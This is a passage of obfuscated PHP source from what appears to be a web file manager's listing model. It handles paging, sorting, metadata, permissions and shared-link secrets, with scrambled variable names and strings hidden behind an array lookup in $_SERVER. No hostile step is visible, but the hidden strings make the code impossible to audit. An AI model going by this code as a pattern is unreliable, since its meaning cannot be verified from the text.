$ş©ÌõŞĞ[$©Ÿ¦¥’‘[$ğ™¨ÛŞ•[87]]] = $©Ÿ¦¥’‘; } $ªö–œ = array(); $²£ßÑÁ = array(); $„ô èÀ´ = array(); foreach ($¶¨Ùé¤ as $Í²¢Õ¶ => $µ·Ÿ) { $Œ³óóöà = !0; if (!$””æó¿) { $ªö–œ[] = $Í²¢Õ¶; continue; } foreach ($””æó¿ as $Ì£¯œó) { if (!in_array($Ì£¯œó, $µ·Ÿ)) { $Œ³óóöà = !1; break; } } if (!$Œ³óóöà) { continue; } if (!is_numeric($Í²¢Õ¶)) { $à‘ÈÙÇ = $ş©ÌõŞĞ[$Í²¢Õ¶]; $¶«¯‡‘ = array($ğ™¨ÛŞ•[32] => $à‘ÈÙÇ[$ğ™¨ÛŞ•[32]], $ğ™¨ÛŞ•[87] => $à‘ÈÙÇ[$ğ™¨ÛŞ•[87]], $ğ™¨ÛŞ•[33] => $à‘ÈÙÇ[$ğ™¨ÛŞ•[33]], $ğ™¨ÛŞ•[90] => array($ğ™¨ÛŞ•[501] => 1), $ğ™¨ÛŞ•[232] => !0); if ($à‘ÈÙÇ[$ğ™¨ÛŞ•[33]] == $ğ™¨ÛŞ•[230]) { $„ô èÀ´[] = $¶«¯‡‘; } if ($à‘ÈÙÇ[$ğ™¨ÛŞ•[33]] == $ğ™¨ÛŞ•[78]) { $²£ßÑÁ[] = $¶«¯‡‘; } continue; } $ªö–œ[] = $Í²¢Õ¶; } if ($ªö–œ) { $×Óò° ı = $this->listSource(array($ğ™¨ÛŞ•[491] => array($ğ™¨ÛŞ•[492], $ªö–œ))); } $×Óò° ı = $×Óò° ı ? $×Óò° ı : array($ğ™¨ÛŞ•[85] => array(), $ğ™¨ÛŞ•[86] => array()); $×Óò° ı[$ğ™¨ÛŞ•[85]] = array_merge($×Óò° ı[$ğ™¨ÛŞ•[85]], $²£ßÑÁ); $×Óò° ı[$ğ™¨ÛŞ•[86]] = array_merge($×Óò° ı[$ğ™¨ÛŞ•[86]], $„ô èÀ´); if (isset($×Óò° ı[$ğ™¨ÛŞ•[442]]) && count($ªö–œ) == $×Óò° ı[$ğ™¨ÛŞ•[442]][$ğ™¨ÛŞ•[443]]) { return $×Óò° ı; } $ÙÖõ¨Ú = array(); $Éö²¨ÜÖ = array_to_keyvalue($×Óò° ı[$ğ™¨ÛŞ•[85]], $ğ™¨ÛŞ•[12], $ğ™¨ÛŞ•[193]); $àáÈêô = array_to_keyvalue($×Óò° ı[$ğ™¨ÛŞ•[86]], $ğ™¨ÛŞ•[12], $ğ™¨ÛŞ•[193]); $™¤²´ª = array_merge($àáÈêô, $Éö²¨ÜÖ); foreach ($ªö–œ as $ßçÂ×) { if (!in_array($ßçÂ×, $™¤²´ª)) { $ÙÖõ¨Ú[] = $ßçÂ×; } } if ($ÙÖõ¨Ú) { Model($ğ™¨ÛŞ•[502])->removeBySource($ÙÖõ¨Ú); } return $×Óò° ı; } public function listUserRecycle() { $™„×î– =& $_SERVER[ˆ¡¹µ‹Â]; $¸µ¦«ê¼ = Model($™„×î–[503])->listData(); if (!$¸µ¦«ê¼) { return array(); } $äŸ¿Ó ” = array($™„×î–[491] => array($™„×î–[492], $¸µ¦«ê¼), $™„×î–[504] => 1); return $this->listSource($äŸ¿Ó ”); } public function listSource($³ºåıà„, $ôÑ’Ò¬ø = 3000, $Øà…ÚÓ‹ = false) { $³Ë½öÜ’ =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($³ºåıà„[$³Ë½öÜ’[505]])) { $³ºåıà„[$³Ë½öÜ’[505]] = 0; } if (isset($³ºåıà„[$³Ë½öÜ’[192]]) && $³ºåıà„[$³Ë½öÜ’[192]] == $³Ë½öÜ’[228]) { $³ºåıà„[$³Ë½öÜ’[486]] = array($³Ë½öÜ’[506], $³Ë½öÜ’[12]); } $è…˜¯— = $³Ë½öÜ’[507]; $«éëúàù = $this->field($è…˜¯—)->_makeOrder()->where($³ºåıà„)->selectPage($ôÑ’Ò¬ø); $this->_listPageCheck($«éëúàù, $è…˜¯—, $³ºåıà„); $this->_listDataApply($«éëúàù[$³Ë½öÜ’[445]], $Øà…ÚÓ‹); $this->_listMake($«éëúàù); return $«éëúàù; } private function _listPageCheck(&$ÁÊÔô°ë, $Àü²˜ú”, $çš‡‹ñ¢) { $£ˆÚô€æ =& $_SERVER[ˆ¡¹µ‹Â]; if (!is_array($ÁÊÔô°ë[$£ˆÚô€æ[442]])) { return; } $†ëÚáö´ = $ÁÊÔô°ë[$£ˆÚô€æ[442]]; if ($†ëÚáö´[$£ˆÚô€æ[444]] <= 1) { return; } if ($†ëÚáö´[$£ˆÚô€æ[443]] >= 100000) { return; } if (Model($£ˆÚô€æ[508])->get($£ˆÚô€æ[509]) != $£ˆÚô€æ[510]) { return; } $Àü²˜ú” = str_replace(array($£ˆÚô€æ[53], $£ˆÚô€æ[418], $£ˆÚô€æ[262]), $£ˆÚô€æ[12], $Àü²˜ú”); $Àü²˜ú” = $£ˆÚô€æ[511] . str_replace($£ˆÚô€æ[50], $£ˆÚô€æ[512], $Àü²˜ú”) . $£ˆÚô€æ[513]; $ÄÏ¼®Å¶ = $£ˆÚô€æ[514]; $ÄÏ¼®Å¶ = $ÄÏ¼®Å¶ . $£ˆÚô€æ[515]; $Ş“¯¼ÔÇ = $†ëÚáö´[$£ˆÚô€æ[439]] * ($†ëÚáö´[$£ˆÚô€æ[429]] - 1) . $£ˆÚô€æ[50] . $†ëÚáö´[$£ˆÚô€æ[439]]; $æçÒë‡Ñ = $this->_makeOrder(!0); $ÔæÛ„•â = $£ˆÚô€æ[511] . str_replace($£ˆÚô€æ[50], $£ˆÚô€æ[512], $æçÒë‡Ñ[0]); if (strpos($ÔæÛ„•â, $£ˆÚô€æ[516])) { $ÔæÛ„•â = str_replace($£ˆÚô€æ[516], $£ˆÚô€æ[517], $ÔæÛ„•â); } else { $ÔæÛ„•â .= $£ˆÚô€æ[518] . $æçÒë‡Ñ[1]; } $ÂÈÃ¨–Ú = array(); foreach ($çš‡‹ñ¢ as $û˜ß¡ñ´ => $ê•”«ú) { $ÂÈÃ¨–Ú[$£ˆÚô€æ[511] . $û˜ß¡ñ´] = $ê•”«ú; } $this->alias($£ˆÚô€æ[519])->field($Àü²˜ú”)->limit($Ş“¯¼ÔÇ)->order($ÔæÛ„•â); $©Ÿ¶şÔñ = $this->join($ÄÏ¼®Å¶)->where($ÂÈÃ¨–Ú)->select(); if ($©Ÿ¶şÔñ) { $ÁÊÔô°ë[$£ˆÚô€æ[445]] = $©Ÿ¶şÔñ; } } protected function _makeOrder($–°àËò = false) { $ÒÒù³¿õ =& $_SERVER[ˆ¡¹µ‹Â]; $åÙ£êö² = Model($ÒÒù³¿õ[520])->get($ÒÒù³¿õ[521]); $áşöĞğæ = Model($ÒÒù³¿õ[520])->get($ÒÒù³¿õ[522]); $Š¹Ó˜·‹ = array($ÒÒù³¿õ[523] => $ÒÒù³¿õ[524], $ÒÒù³¿õ[525] => $ÒÒù³¿õ[526]); $œ’Õ¼®Ì = array($ÒÒù³¿õ[32] => $ÒÒù³¿õ[32], $ÒÒù³¿õ[79] => $ÒÒù³¿õ[79], $ÒÒù³¿õ[169] => $ÒÒù³¿õ[486], $ÒÒù³¿õ[527] => $ÒÒù³¿õ[527], $ÒÒù³¿õ[528] => $ÒÒù³¿õ[529], $ÒÒù³¿õ[231] => $ÒÒù³¿õ[231], $ÒÒù³¿õ[88] => $ÒÒù³¿õ[88]); $•ùêÚ¶ = Input::get($ÒÒù³¿õ[530], $ÒÒù³¿õ[7], $åÙ£êö², array_keys($œ’Õ¼®Ì)); $ô ô¾Ê = Input::get($ÒÒù³¿õ[531], $ÒÒù³¿õ[7], $áşöĞğæ, array_keys($Š¹Ó˜·‹)); if (!in_array($•ùêÚ¶, array_keys($œ’Õ¼®Ì))) { $•ùêÚ¶ = $ÒÒù³¿õ[32]; } if (!in_array($ô ô¾Ê, array_keys($Š¹Ó˜·‹))) { $•ùêÚ¶ = $ÒÒù³¿õ[523]; } if ($•ùêÚ¶ == $ÒÒù³¿õ[32]) { } $ë°’´‚å = $ÒÒù³¿õ[532] . $œ’Õ¼®Ì[$•ùêÚ¶] . $ÒÒù³¿õ[53] . $Š¹Ó˜·‹[$ô ô¾Ê]; $ë°’´‚å = rtrim(trim($ë°’´‚å), $ÒÒù³¿õ[50]); if ($–°àËò) { return array($ë°’´‚å, $Š¹Ó˜·‹[$ô ô¾Ê]); } return $this->order($ë°’´‚å); } protected function _listDataApplyItem($•Ï™¦Ø¾, $òö®£ = false) { $ÍÜÛ¢¶ç = array($•Ï™¦Ø¾); $this->_listDataApply($ÍÜÛ¢¶ç, $òö®£); return $ÍÜÛ¢¶ç[0]; } protected function _listDataApply(&$´Ğíë“Š, $Ú°¢ú©¯ = false) { $Š¹ÙËÂÏ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$´Ğíë“Š) { $´Ğíë“Š = array(); return; } $ìšÄ•Ô¤ = array_to_keyvalue($´Ğíë“Š, $Š¹ÙËÂÏ[12], $Š¹ÙËÂÏ[193]); $ìšÄ•Ô¤ = array_unique($ìšÄ•Ô¤); $this->_listSourceCache($´Ğíë“Š); if (!$Ú°¢ú©¯) { $this->_listAppendMeta($´Ğíë“Š, $ìšÄ•Ô¤); $this->_listAppendFileMeta($´Ğíë“Š, $ìšÄ•Ô¤); $this->_listAppendChildren($´Ğíë“Š, $ìšÄ•Ô¤); } $this->_listAppendPath($´Ğíë“Š); $this->_listAppendAuth($´Ğíë“Š); $this->_listAppendSourceInfo($´Ğíë“Š, $ìšÄ•Ô¤); $this->_listAppendUser($´Ğíë“Š); $this->_listFilterInfo($´Ğíë“Š, $Ú°¢ú©¯); $this->_listAppendAuthSecret($´Ğíë“Š); } protected function _listSourceCache($ò«ïÍ») { $¬Åş¼Ë =& $_SERVER[ˆ¡¹µ‹Â]; foreach ($ò«ïÍ» as $Ñ×˜èá) { self::$cacheSourceInfo[$¬Åş¼Ë[533] . $Ñ×˜èá[$¬Åş¼Ë[193]]] = $Ñ×˜èá; } } protected function _listFilterInfo(&$ëãüöî¨, $ù¸úùë° = false) { $’ëŠ†‰ =& $_SERVER[ˆ¡¹µ‹Â]; foreach ($ëãüöî¨ as &$…«¿”ùù) { $…«¿”ùù = $this->pathInfoFilter($…«¿”ùù); self::$cachePathInfo[$’ëŠ†‰[534] . intval($ù¸úùë°) . $’ëŠ†‰[462] . $…«¿”ùù[$’ëŠ†‰[193]]] = $…«¿”ùù; } unset($…«¿”ùù); } protected function _listMake(&$­‹úˆÂî) { $¾™ÓŒêÂ =& $_SERVER[ˆ¡¹µ‹Â]; $­‹úˆÂî[$¾™ÓŒêÂ[85]] = array(); $­‹úˆÂî[$¾™ÓŒêÂ[86]] = array(); foreach ($­‹úˆÂî[$¾™ÓŒêÂ[445]] as $ïÔ‘¨Ä) { $Ö‹–Šˆì = $ïÔ‘¨Ä[$¾™ÓŒêÂ[485]] == 1 ? $¾™ÓŒêÂ[85] : $¾™ÓŒêÂ[86]; $­‹úˆÂî[$Ö‹–Šˆì][] = $ïÔ‘¨Ä; } unset($­‹úˆÂî[$¾™ÓŒêÂ[445]]); } protected function _listAppendMeta(&$ú‡Ê‹©, $èç¦ä¤Ğ) { $ƒ®°ö³Ñ =& $_SERVER[ˆ¡¹µ‹Â]; $†ÀıŞ¥õ = array($ƒ®°ö³Ñ[491] => array($ƒ®°ö³Ñ[492], $èç¦ä¤Ğ)); $¶æ ‡¶Ç = Model($ƒ®°ö³Ñ[535])->field($ƒ®°ö³Ñ[536])->where($†ÀıŞ¥õ)->select(); if (!$¶æ ‡¶Ç) { return; } $÷ŞÁµíõ = array($ƒ®°ö³Ñ[537], $ƒ®°ö³Ñ[538], $ƒ®°ö³Ñ[517]); $Äîßâ·Ş = array(); foreach ($¶æ ‡¶Ç as $ğ¼ÛµåÓ) { if (!isset($Äîßâ·Ş[$ğ¼ÛµåÓ[$ƒ®°ö³Ñ[193]]])) { $Äîßâ·Ş[$ğ¼ÛµåÓ[$ƒ®°ö³Ñ[193]]] = array(); } if (in_array($ğ¼ÛµåÓ[$ƒ®°ö³Ñ[97]], $÷ŞÁµíõ)) { continue; } $Äîßâ·Ş[$ğ¼ÛµåÓ[$ƒ®°ö³Ñ[193]]][$ğ¼ÛµåÓ[$ƒ®°ö³Ñ[97]]] = $ğ¼ÛµåÓ[$ƒ®°ö³Ñ[450]]; } foreach ($ú‡Ê‹© as &$íÖÖ’ÑÚ) { $íÖÖ’ÑÚ[$ƒ®°ö³Ñ[539]] = !1; if (isset($Äîßâ·Ş[$íÖÖ’ÑÚ[$ƒ®°ö³Ñ[193]]])) { $íÖÖ’ÑÚ[$ƒ®°ö³Ñ[539]] = $Äîßâ·Ş[$íÖÖ’ÑÚ[$ƒ®°ö³Ñ[193]]]; } if ($this->fileIsLock($íÖÖ’ÑÚ) && $íÖÖ’ÑÚ[$ƒ®°ö³Ñ[487]]) { $°²§Ó„› = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $íÖÖ’ÑÚ[$ƒ®°ö³Ñ[487]][$ƒ®°ö³Ñ[488]] = AuthModel::authDisable($íÖÖ’ÑÚ[$ƒ®°ö³Ñ[487]][$ƒ®°ö³Ñ[488]], $°²§Ó„›); $íÖÖ’ÑÚ[$ƒ®°ö³Ñ[487]][$ƒ®°ö³Ñ[540]][$ƒ®°ö³Ñ[487]] = $íÖÖ’ÑÚ[$ƒ®°ö³Ñ[487]][$ƒ®°ö³Ñ[488]]; } } unset($íÖÖ’ÑÚ); } protected function _listAppendFileMeta(&$àíÅ¨¬ò, $„¦é­) { $û›İäı =& $_SERVER[ˆ¡¹µ‹Â]; $¶èªµ·ç = array_to_keyvalue($àíÅ¨¬ò, $û›İäı[12], $û›İäı[541]); $¶èªµ·ç = array_filter(array_unique($¶èªµ·ç)); if (!$¶èªµ·ç) { return; } $ìúÖÇ² = array($û›İäı[542] => array($û›İäı[492], $¶èªµ·ç)); $™‹¿ÚÄ£ = $û›İäı[543]; $æĞ¤İ† = Model($û›İäı[544])->field($™‹¿ÚÄ£)->where($ìúÖÇ²)->select(); $æĞ¤İ† = array_to_keyvalue($æĞ¤İ†, $û›İäı[541]); $Ùö¯ĞÈı = Model($û›İäı[545])->field($û›İäı[546])->where($ìúÖÇ²)->select(); $Ùö¯ĞÈı = $Ùö¯ĞÈı ? $Ùö¯ĞÈı : array(); $ÎƒŠå¦Ù = array(); foreach ($Ùö¯ĞÈı as $»¯—š„Ì) { if (!isset($ÎƒŠå¦Ù[$»¯—š„Ì[$û›İäı[541]]])) { $ÎƒŠå¦Ù[$»¯—š„Ì[$û›İäı[541]]] = array(); } $ÎƒŠå¦Ù[$»¯—š„Ì[$û›İäı[541]]][$»¯—š„Ì[$û›İäı[97]]] = $»¯—š„Ì[$û›İäı[450]]; } foreach ($àíÅ¨¬ò as &$¡Íµü¶) { $ÍÁíƒ‹ = $¡Íµü¶[$û›İäı[541]]; if (!$ÍÁíƒ‹ || !is_array($æĞ¤İ†[$ÍÁíƒ‹])) { continue; } $Â©Óúş» = $æĞ¤İ†[$ÍÁíƒ‹]; $Â©Óúş»[$û›İäı[79]] = $¡Íµü¶[$û›İäı[79]]; $Â©Óúş»[$û›İäı[32]] = $¡Íµü¶[$û›İäı[32]]; if (!$Â©Óúş»[$û›İäı[547]]) { Model($û›İäı[544])->fileMd5Check($Â©Óúş»); } if (!isset(self::$cacheFileInfo[$û›İäı[548] . $ÍÁíƒ‹])) { self::$cacheFileInfo[$û›İäı[548] . $ÍÁíƒ‹] = array_merge(array(), $Â©Óúş»); } unset($æĞ¤İ†[$ÍÁíƒ‹][$û›İäı[87]]); $ÁëğÇ…Õ = isset($ÎƒŠå¦Ù[$ÍÁíƒ‹]) && is_array($ÎƒŠå¦Ù[$ÍÁíƒ‹]) ? $ÎƒŠå¦Ù[$ÍÁíƒ‹] : array(); $¡Íµü¶[$û›İäı[170]] = array_merge($ÁëğÇ…Õ, $æĞ¤İ†[$ÍÁíƒ‹]); if (isset($¡Íµü¶[$û›İäı[170]][$û›İäı[184]])) { $¡Íµü¶[$û›İäı[184]] = json_decode($¡Íµü¶[$û›İäı[170]][$û›İäı[184]], !0); unset($¡Íµü¶[$û›İäı[170]][$û›İäı[184]]); } } unset($¡Íµü¶); } protected function _listAppendSourceInfo(&$§¡ÌÛÄö, $¸øìÇß‘) { $ëèÓéŞª =& $_SERVER[ˆ¡¹µ‹Â]; $äúïÏÓ = Model($ëèÓéŞª[549])->listData(); $°ñš¶‚Ø = Model($ëèÓéŞª[499])->listData(); $ü¥ÖÙÅì = Model($ëèÓéŞª[489])->listData(); $³ì±£•œ = Model($ëèÓéŞª[550])->listSimple(); $‡øœÎÄ© = array_to_keyvalue($äúïÏÓ, $ëèÓéŞª[475]); $–†Ô½ã = array_to_keyvalue_group($°ñš¶‚Ø, $ëèÓéŞª[87], $ëèÓéŞª[500]); $‰¢Âà‰ï = array_to_keyvalue($ü¥ÖÙÅì, $ëèÓéŞª[87]); $”šıÔœÜ = array_to_keyvalue_group($³ì±£•œ, $ëèÓéŞª[193]); foreach ($§¡ÌÛÄö as &$ø°÷å‚à) { $ø°÷å‚à[$ëèÓéŞª[90]] = array($ëèÓéŞª[551] => 0, $ëèÓéŞª[552] => 0, $ëèÓéŞª[553] => 0); if (isset($‰¢Âà‰ï[$ø°÷å‚à[$ëèÓéŞª[193]]])) { $ø°÷å‚à[$ëèÓéŞª[90]][$ëèÓéŞª[554]] = 1; $ø°÷å‚à[$ëèÓéŞª[90]][$ëèÓéŞª[555]] = $‰¢Âà‰ï[$ø°÷å‚à[$ëèÓéŞª[193]]][$ëèÓéŞª[32]]; } if ($–†Ô½ã && $‡øœÎÄ© && isset($–†Ô½ã[$ø°÷å‚à[$ëèÓéŞª[193]]])) { $ø°÷å‚à[$ëèÓéŞª[90]][$ëèÓéŞª[556]] = array(); foreach ($–†Ô½ã[$ø°÷å‚à[$ëèÓéŞª[193]]] as $Èœ¶ùüÃ) { $Ï…è²Å = $‡øœÎÄ©[$Èœ¶ùüÃ]; $ø°÷å‚à[$ëèÓéŞª[90]][$ëèÓéŞª[556]][] = array($ëèÓéŞª[557] => $Ï…è²Å[$ëèÓéŞª[475]], $ëèÓéŞª[494] => $Ï…è²Å[$ëèÓéŞª[32]], $ëèÓéŞª[558] => $Ï…è²Å[$ëèÓéŞª[559]]); } } if ($”šıÔœÜ && isset($”šıÔœÜ[$ø°÷å‚à[$ëèÓéŞª[193]]])) { $ø°÷å‚à[$ëèÓéŞª[90]][$ëèÓéŞª[560]] = array(); foreach ($”šıÔœÜ[$ø°÷å‚à[$ëèÓéŞª[193]]] as $ò´Ç¶¼’) { $¬ºİ‹ß¤ = $ëèÓéŞª[561]; if ($ò´Ç¶¼’[$ëèÓéŞª[562]] == $ëèÓéŞª[91]) { $¬ºİ‹ß¤ .= $ëèÓéŞª[563]; } $ø°÷å‚à[$ëèÓéŞª[90]][$ëèÓéŞª[560]] = array_field_key($ò´Ç¶¼’, explode($ëèÓéŞª[50], $¬ºİ‹ß¤)); } } } unset($ø°÷å‚à); return $§¡ÌÛÄö; } protected function _listAppendChildren(&$±ÉÕğôå, $ï—í¥Ğü) { $Áäû”³ß =& $_SERVER[ˆ¡¹µ‹Â]; $ÇÑìı®˜ = array(); $ìÀë–ÖŞ = array($Áäû”³ß[239] => 0, $Áäû”³ß[240] => 0); foreach ($±ÉÕğôå as &$ÓõÜÄ”) { if (!$ÓõÜÄ”[$Áäû”³ß[485]]) { continue; } $ÇÑìı®˜[] = $ÓõÜÄ”[$Áäû”³ß[193]]; } unset($ÓõÜÄ”); if (!$ÇÑìı®˜) { return; } $©¥Ëº® = array($Áäû”³ß[192] => array($Áäû”³ß[7], $ÇÑìı®˜), $Áäû”³ß[505] => 0); $ãíÙ¡’ = array($Áäû”³ß[192], $Áäû”³ß[485], $Áäû”³ß[564] => $Áäû”³ß[565]); $Ó„ÎÀ³÷ = $this->field($ãíÙ¡’)->where($©¥Ëº®)->group($Áäû”³ß[566])->select(); $íÇ  õ = array(); foreach ($Ó„ÎÀ³÷ as $Öáš›øá) { $õ˜øÈ–¹ = $Öáš›øá[$Áäû”³ß[192]]; $ùèËı¨ = $Öáš›øá[$Áäû”³ß[485]] == $Áäû”³ß[91] ? $Áäû”³ß[240] : $Áäû”³ß[239]; if (!isset($íÇ  õ[$õ˜øÈ–¹])) { $íÇ  õ[$õ˜øÈ–¹] = array($Áäû”³ß[239] => 0, $Áäû”³ß[240] => 0); } $íÇ  õ[$õ˜øÈ–¹][$ùèËı¨] += $Öáš›øá[$Áäû”³ß[565]]; } foreach ($±ÉÕğôå as &$ÓõÜÄ”) { if (!$ÓõÜÄ”[$Áäû”³ß[485]]) { continue; } $ó·îëüŒ = is_array($íÇ  õ[$ÓõÜÄ”[$Áäû”³ß[193]]]) ? $íÇ  õ[$ÓõÜÄ”[$Áäû”³ß[193]]] : $ìÀë–ÖŞ; $ÓõÜÄ”[$Áäû”³ß[240]] = $ó·îëüŒ[$Áäû”³ß[240]]; $ÓõÜÄ”[$Áäû”³ß[239]] = $ó·îëüŒ[$Áäû”³ß[239]]; unset($ÓõÜÄ”[$Áäû”³ß[486]]); } unset($ÓõÜÄ”); } protected function _listAppendAuth(&$Ò‚Ûé¶â) { $ ğóŸñœ =& $_SERVER[ˆ¡¹µ‹Â]; $¦—èî‹Ì = array(); foreach ($Ò‚Ûé¶â as $¦¡ÒÈˆğ) { if ($¦¡ÒÈˆğ[$ ğóŸñœ[190]] == self::TYPE_GROUP) { $¦—èî‹Ì[] = $¦¡ÒÈˆğ[$ ğóŸñœ[193]]; } } if (!$¦—èî‹Ì) { return; } $şúß¥èµ = array_to_keyvalue($Ò‚Ûé¶â, $ ğóŸñœ[193]); $ˆŒ§ã­ = Model($ ğóŸñœ[567])->getSourceList($¦—èî‹Ì, $şúß¥èµ); $éåˆÕÆğ = KodUser::isRoot(); foreach ($Ò‚Ûé¶â as $ş£È§¯¶ => &$¦¡ÒÈˆğ) { $¦¡ÒÈˆğ[$ ğóŸñœ[487]] = $ˆŒ§ã­[$¦¡ÒÈˆğ[$ ğóŸñœ[193]]]; if (!$¦¡ÒÈˆğ[$ ğóŸñœ[487]] && $¦¡ÒÈˆğ[$ ğóŸñœ[190]] == self::TYPE_GROUP) { $¦¡ÒÈˆğ[$ ğóŸñœ[487]] = Action($ ğóŸñœ[568])->pathGroupAuthMake($¦¡ÒÈˆğ[$ ğóŸñœ[569]]); if (!$¦¡ÒÈˆğ[$ ğóŸñœ[487]] && !$éåˆÕÆğ) { $¦¡ÒÈˆğ[$ ğóŸñœ[233]] = !1; $¦¡ÒÈˆğ[$ ğóŸñœ[232]] = !1; } } if ($¦¡ÒÈˆğ[$ ğóŸñœ[487]]) { $¦¡ÒÈˆğ[$ ğóŸñœ[233]] = AuthModel::authCheckEdit($¦¡ÒÈˆğ[$ ğóŸñœ[487]][$ ğóŸñœ[488]]); $¦¡ÒÈˆğ[$ ğóŸñœ[232]] = AuthModel::authCheckView($¦¡ÒÈˆğ[$ ğóŸñœ[487]][$ ğóŸñœ[488]]); } $this->groupPathDisplay($¦¡ÒÈˆğ); } unset($¦¡ÒÈˆğ); } public function _listAppendAuthSecret(&$†ü·™İÎ) { $˜©´Ûú‹ =& $_SERVER[ˆ¡¹µ‹Â]; if (Model($˜©´Ûú‹[508])->get($˜©´Ûú‹[570]) != $˜©´Ûú‹[91]) { return; } static $¯¥ùÆÔ· = false; if (!$¯¥ùÆÔ·) { $á´Å¬Ñ = Model($˜©´Ûú‹[571]); $²“×å¬† = Model($˜©´Ûú‹[572]); $¯¥ùÆÔ· = $²“×å¬†->listData(); $¯¥ùÆÔ· = array_to_keyvalue($¯¥ùÆÔ·, $˜©´Ûú‹[193]); $úëá¼î = json_decode(Model($˜©´Ûú‹[508])->get($˜©´Ûú‹[573]), !0); $úëá¼î = array_to_keyvalue($úëá¼î, $˜©´Ûú‹[475]); foreach ($¯¥ùÆÔ· as $‰ÆÙ¢Í => $İû¥ÃÅ) { $öŞ´âéå = $úëá¼î[$İû¥ÃÅ[$˜©´Ûú‹[574]]]; if (!$öŞ´âéå) { $²“×å¬†->remove($İû¥ÃÅ[$˜©´Ûú‹[475]]); unset($¯¥ùÆÔ·[$‰ÆÙ¢Í]); continue; } $äÖ³Áµê = $á´Å¬Ñ->listData($öŞ´âéå[$˜©´Ûú‹[487]]); if (!$äÖ³Áµê) { $²“×å¬†->remove($İû¥ÃÅ[$˜©´Ûú‹[475]]); unset($¯¥ùÆÔ·[$‰ÆÙ¢Í]); continue; } $İû¥ÃÅ[$˜©´Ûú‹[487]] = $äÖ³Áµê; $İû¥ÃÅ[$˜©´Ûú‹[575]] = $öŞ´âéå; $İû¥ÃÅ[$˜©´Ûú‹[576]] = Model($˜©´Ûú‹[577])->getInfoSimpleOuter($İû¥ÃÅ[$˜©´Ûú‹[527]]); $¯¥ùÆÔ·[$‰ÆÙ¢Í] = $İû¥ÃÅ; } } $Âƒô‰÷Ì = USER_ID; $§½›ç‹Ù = array(); $¨úõÓáˆ = $this->_listAppendPath($§½›ç‹Ù, !0); foreach ($†ü·™İÎ as $‰ÆÙ¢Í => &$İû¥ÃÅ) { if (!is_array($İû¥ÃÅ[$˜©´Ûú‹[487]])) { continue; } if ($İû¥ÃÅ[$˜©´Ûú‹[190]] != $˜©´Ûú‹[578]) { continue; } if (isset($¯¥ùÆÔ·[$İû¥ÃÅ[$˜©´Ûú‹[193]]])) { $Ë—˜«Ÿè = $¯¥ùÆÔ·[$İû¥ÃÅ[$˜©´Ûú‹[193]]]; if (!is_array($İû¥ÃÅ[$˜©´Ûú‹[539]])) { $İû¥ÃÅ[$˜©´Ûú‹[539]] = array(); } $İû¥ÃÅ[$˜©´Ûú‹[539]][$˜©´Ûú‹[579]] = $Ë—˜«Ÿè[$˜©´Ûú‹[574]]; $İû¥ÃÅ[$˜©´Ûú‹[487]][$˜©´Ûú‹[580]] = $Ë—˜«Ÿè; $İû¥ÃÅ[$˜©´Ûú‹[487]][$˜©´Ûú‹[581]] = $İû¥ÃÅ[$˜©´Ûú‹[582]]; $İû¥ÃÅ[$˜©´Ûú‹[487]][$˜©´Ûú‹[583]] = $˜©´Ûú‹[91]; if ($Ë—˜«Ÿè[$˜©´Ûú‹[527]] != $Âƒô‰÷Ì) { $İû¥ÃÅ[$˜©´Ûú‹[487]][$˜©´Ûú‹[488]] = $İû¥ÃÅ[$˜©´Ûú‹[487]][$˜©´Ûú‹[488]] & $Ë—˜«Ÿè[$˜©´Ûú‹[487]][$˜©´Ûú‹[487]]; } continue; } $çÊî”×“ = $this->parentLevelArray($İû¥ÃÅ[$˜©´Ûú‹[584]]); $Û©ûÀŞÒ = array_reverse($çÊî”×“); foreach ($Û©ûÀŞÒ as $ãø‡êÂÒ => $‹½¢Ú‘ï) { if (!isset($¯¥ùÆÔ·[$‹½¢Ú‘ï])) { continue; } $Ë—˜«Ÿè = $¯¥ùÆÔ·[$‹½¢Ú‘ï]; $İû¥ÃÅ[$˜©´Ûú‹[487]][$˜©´Ûú‹[580]] = $Ë—˜«Ÿè; if ($Ë—˜«Ÿè[$˜©´Ûú‹[527]] != $Âƒô‰÷Ì) { $İû¥ÃÅ[$˜©´Ûú‹[487]][$˜©´Ûú‹[488]] = $İû¥ÃÅ[$˜©´Ûú‹[487]][$˜©´Ûú‹[488]] & $Ë—˜«Ÿè[$˜©´Ûú‹[487]][$˜©´Ûú‹[487]]; } $íòòö¸ = $˜©´Ûú‹[12]; $÷ø¥äõ™ = count($çÊî”×“) - $ãø‡êÂÒ; for ($Ğ€ØÌÏ– = 0; $Ğ€ØÌÏ– < $÷ø¥äõ™; $Ğ€ØÌÏ–++) { if (!isset($¨úõÓáˆ[$çÊî”×“[$Ğ€ØÌÏ–]])) { $íòòö¸ = $˜©´Ûú‹[12]; break; } $íòòö¸ = $íòòö¸ . rtrim($¨úõÓáˆ[$çÊî”×“[$Ğ€ØÌÏ–]], $˜©´Ûú‹[8]) . $˜©´Ûú‹[8]; } $İû¥ÃÅ[$˜©´Ûú‹[487]][$˜©´Ûú‹[581]] = rtrim($íòòö¸, $˜©´Ûú‹[8]) . $˜©´Ûú‹[8]; break; } } unset($İû¥ÃÅ); } public function groupPathDisplay(&$Ì‘‡—¦) { $…×óİ£ =& $_SERVER[ˆ¡¹µ‹Â]; if ($Ì‘‡—¦[$…×óİ£[190]] != self::TYPE_GROUP) { return; } $›µÄ˜Ê = Model($…×óİ£[585])->getInfo($Ì‘‡—¦[$…×óİ£[569]]); $ÈŞô¤à½ = $this->parentLevelArray($›µÄ˜Ê[$…×óİ£[584]]); $‘½«Î¨† = $…×óİ£[12]; foreach ($ÈŞô¤à½ as $’äÄî‹) { $Ş¡¹£äÊ = Model($…×óİ£[585])->getInfo($’äÄî‹); $‘½«Î¨† .= $Ş¡¹£äÊ[$…×óİ£[90]][$…×óİ£[193]] . $…×óİ£[50]; } $Ì‘‡—¦[$…×óİ£[586]] = $›µÄ˜Ê[$…×óİ£[192]]; $Ì‘‡—¦[$…×óİ£[587]] = $›µÄ˜Ê[$…×óİ£[584]]; $Ì‘‡—¦[$…×óİ£[588]] = $›µÄ˜Ê[$…×óİ£[589]]; $Ì‘‡—¦[$…×óİ£[590]] = $‘½«Î¨† . $›µÄ˜Ê[$…×óİ£[90]][$…×óİ£[193]]; } protected function _listAppendPath(&$²“åöù—, $õ˜ÀÃüÈ = false) { $€Ú†Å£‹ =& $_SERVER[ˆ¡¹µ‹Â]; static $âÈŸ­ = array(); $ÕÖÑªî¦ = array(); $šáçÂşÆ = array(); if ($õ˜ÀÃüÈ) { 